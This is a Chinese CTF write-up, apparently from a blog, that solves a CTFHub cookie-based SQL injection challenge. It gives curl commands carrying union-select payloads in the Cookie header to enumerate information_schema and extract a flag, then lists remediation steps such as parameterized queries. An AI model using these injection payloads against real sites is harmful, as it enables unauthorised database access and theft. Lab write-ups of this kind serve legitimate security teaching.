
---
layout: post
title: "CTFHub Writeup-Cookie注入"
date: 2026-10-25
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - Cookie注入 

## 题目类型

WEB


## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - Cookie注入 |
| 靶场地址 | `http://challenge-ba7531bf7b336c5d.sandbox.ctfhub.com:10800` |
| 注入位置 | Cookie `id` |
| 数据库 | `sqli`（MariaDB 10.3.22） |
| 表 / 字段 | `cuiubhuhdk` / `vaiocrvvfm`（随机名） |
| Flag | `ctfhub{58ecd7944c305eda5d4984d0}` |
## 0x02 漏洞原理
Cookie 注入的本质还是 SQL 注入，只是**输入点从 URL 参数换成了 Cookie**。
正常的页面会把 `id` 放在 GET 或 POST 里，安全设备、WAF、日志也大多盯着这两处。有些程序为了「方便」，直接读 `$_COOKIE['id']` 拼进 SQL，于是攻击者只要改一下浏览器里的 Cookie，就绕过了只检查 URL 的防护。
本题打开首页，响应头里有两条：
```
Set-Cookie: id=1
Set-Cookie: hint=id输入1试试？
```
页面还特意提示「这次的输入点变了。尝试找找Cookie吧」，等于直接告诉我们：把 payload 放进 Cookie `id` 里。
Cookie 注入和普通注入的利用方式完全一样：
- 页面有回显，就用 `union select`；
- 没有回显，就用布尔或时间盲注。
本题属于有回显的类型，所以直接查 `information_schema` 就能拿到全部结构。
## 0x03 解题过程
**3.1 找注入点**
先用 curl 带上默认 Cookie 访问：
```
curl -b "id=1" http://challenge-ba7531bf7b336c5d.sandbox.ctfhub.com:10800/
```
页面回显：
```
select * from news where id=1
ID: 1
Data: ctfhub
```
把 `id` 改成 `1'`：
```
curl -b "id=1'" http://challenge-ba7531bf7b336c5d.sandbox.ctfhub.com:10800/
```
页面不再显示 `ID` 和 `Data`，说明单引号破坏了 SQL 语法，Cookie `id` 处存在注入。报错被关掉了，看不到具体错误，只能靠回显判断。
**3.2 判断列数**
用 `order by` 递增试：
```
curl -b "id=1 order by 1" ...
curl -b "id=1 order by 2" ...
curl -b "id=1 order by 3" ...
```
前两个有回显，`order by 3` 无回显，说明原查询一共 **2 列**。
**3.3 确认回显位**
直接 `union select 1,2` 时页面只显示原查询的第一行，所以要用一个不存在的 id 把前半段置空：
```
curl -b "id=-1 union select 1,2" ...
```
回显：
```
ID: 1
Data: 2
```
两个位置都能回显，后续把要查的内容放在第 1 列即可。
**3.4 查库名和版本**
```
curl -b "id=-1 union select database(),version()" ...
```
```
ID: sqli
Data: 10.3.22-MariaDB-0+deb10u1
```
当前库是 `sqli`。顺便看连接用户：
```
curl -b "id=-1 union select user(),@@version_compile_os" ...
ID: root@localhost
Data: debian-linux-gnu
```
**3.5 查表名**
查当前库下所有表：
```sql
select group_concat(table_name)
from information_schema.tables
where table_schema=database()
```
拼进 Cookie：
```
curl -b "id=-1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()" ...
```
回显：
```
ID: cuiubhuhdk,news
```
除了正常的 `news` 表，还有一张随机名表 `cuiubhuhdk`，flag 就在里面。
**3.6 查字段名**
```
curl -b "id=-1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='cuiubhuhdk'" ...
```
回显：
```
ID: vaiocrvvfm
```
字段名同样是随机串 `vaiocrvvfm`。
**3.7 取 flag**
把表和字段代进去：
```
curl -b "id=-1 union select vaiocrvvfm,2 from cuiubhuhdk limit 0,1" ...
```
回显：
```
ID: ctfhub{58ecd7944c305eda5d4984d0}
Data: 2
```
拿到 Flag：
```
ctfhub{58ecd7944c305eda5d4984d0}
```
**3.8 验证**
再查三件事确认：
```
curl -b "id=-1 union select concat('LEN=',length(vaiocrvvfm)),2 from cuiubhuhdk limit 0,1" ...
-> LEN=32
curl -b "id=-1 union select count(*),2 from cuiubhuhdk" ...
-> 1
curl -b "id=-1 union select vaiocrvvfm,2 from cuiubhuhdk where vaiocrvvfm='ctfhub{58ecd7944c305eda5d4984d0}'" ...
-> ctfhub{58ecd7944c305eda5d4984d0}
```
长度 32、表里只有 1 行、等式精确匹配也能查出来，说明 flag 正确且唯一。
**3.9 浏览器里怎么改**
不用 curl 也可以，用浏览器的开发者工具：
- F12 打开开发者工具，切到「应用 / Application」→「Cookie」；
- 找到当前站点的 `id`，把值从 `1` 改成 `-1 union select ...`；
- 刷新页面即可看到回显。
注意：Cookie 里的 payload 要**原样发送**，不要做 URL 编码。PHP 取 `$_COOKIE` 时不会自动解码，编码后的 `%20`、`%27` 会被当成普通字符带进 SQL，导致语法错误。
## 0x04 完整流程
| 步骤 | Cookie 值 | 结果 |
| --- | --- | --- |
| 找注入点 | `id=1'` | 回显消失，确认注入 |
| 判断列数 | `id=1 order by 2` / `3` | 2 列 |
| 库名 | `id=-1 union select database(),version()` | `sqli` |
| 表名 | `group_concat(table_name)` | `cuiubhuhdk,news` |
| 字段名 | `group_concat(column_name)` | `vaiocrvvfm` |
| flag | `select vaiocrvvfm from cuiubhuhdk` | `ctfhub{58ecd7944c305eda5d4984d0}` |
整条链路可以概括为：**改 Cookie → `order by` 定列数 → `-1 union select` 占回显位 → 查 `information_schema` → 取数据。**
## 0x05 踩坑记录
1. **注入点不在 URL 里**：直接访问首页，`?id=1` 没有任何效果，因为程序读的是 Cookie。必须先看到 `Set-Cookie: id=1`，或者按页面提示去翻 Cookie，才能找到入口。
2. **别对 Cookie 做 URL 编码**：Cookie 和 URL 参数不一样，`$_COOKIE` 拿到的是原始字符串。把空格写成 `%20`、单引号写成 `%27`，SQL 里就会出现一堆百分号，直接语法错误。
3. **Cookie 值里的特殊字符**：分号 `;` 是 Cookie 的分隔符，payload 里绝不能出现；逗号、空格在 curl 里能正常发送，但某些浏览器或代理可能会处理，必要时用 Burp 直接改请求头最稳。
4. **union 前半段要置空**：`1 union select 1,2` 只会显示原查询的第一行，必须用 `-1` 或 `0` 让前半段查不到数据。
5. **页面只显示第一行**：即使 union 返回多行，页面也只取第一条。要么加 `limit 0,1`，要么用 `group_concat()` 把多行拼成一行。
6. **表名和字段名是随机的**：`cuiubhuhdk`、`vaiocrvvfm` 这种名字猜不到，必须查 `information_schema`，不能凭经验写 `flag`。
7. **报错被关掉了**：`error_reporting(0)` 让错误页面一片空白，判断注入是否成功只能看 `ID` / `Data` 有没有出现。
## 0x06 修复建议
1. **不要信任 Cookie**：Cookie 完全由客户端控制，任何来自 Cookie 的值都必须当作不可信输入处理。
2. **使用预编译（参数化查询）**：`PDO` 的 `prepare/execute` 或 `mysqli` 预处理，把 `id` 作为参数绑定，注入从根上消失。
3. **对输入做类型校验**：`id` 应该是整数，用 `intval()` 强转或正则限制为纯数字。
4. **Cookie 加签名**：对 Cookie 做 HMAC 签名或使用服务端 Session，客户端无法伪造内容。
5. **关闭详细报错**：`display_errors=Off`，错误只写日志；不要把执行的 SQL 回显到页面。
6. **最小权限**：Web 应用不要用 root 连库，只授予业务所需的 `SELECT` 权限。
7. **WAF 覆盖 Cookie**：很多规则只检查 URL 和 POST，要确认 Cookie 头也在检测范围内。
## 0x07 总结
Cookie 注入没有新技术，考的是「能不能想到输入点在 Cookie」。
页面把 `id` 藏进 Cookie，URL 里怎么试都没反应，但只要抓一次包、看一眼 `Set-Cookie`，入口就暴露了。之后的利用和普通 union 注入一模一样：定列数、占回显位、查 `information_schema`、取数据。
这也提醒我们：安全防护不能只盯着 URL 参数，Cookie、Header、JSON body 都可能是注入点；而防御的根本永远是参数化查询，而不是在某个入口上打补丁

